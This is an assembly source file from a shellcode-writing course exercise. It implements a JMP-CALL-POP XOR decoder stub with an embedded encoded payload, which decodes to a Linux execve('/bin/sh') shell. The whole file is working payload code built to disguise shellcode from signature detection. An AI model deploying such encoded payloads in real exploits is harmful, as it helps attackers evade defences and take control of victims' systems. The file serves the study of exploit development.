; File: xor-decoder-maker.nasm
; Author: Kevin Ren, originally professor viviek of SLAE
; Purpose: to demostrate decoding of xor ecoded shellcode and 
; 		execute without hardcode length by using a marker

; NOTE: we will use the JMP CALL POP Technique to manipulate and decode our encoded shellcode
; NOTE: this method will result in seg fault if compiled and ran without a shellcode skeleton, because we are overwritting text section

global _start

section .text
_start:
	jmp short call_decoder

decoder:
	pop esi				; esi has the address that points to Shellcode (encoded)
decode:
	xor byte [esi], 0xAA		; XORing the first byte of what is stored at ESI address
	jz shellcode			; if XORing results in 0, as with marker, ZF will set and this will transfer control to Shellcode
	inc esi				; if not at marker yet, we will increment esi by a byte
	jmp short decode		; and unconditionally jump to Decode label again


call_decoder:
	call decoder
	shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0xaa			; 0xaa is our last marker because its the string we XORed against during encoding, and will result in zero

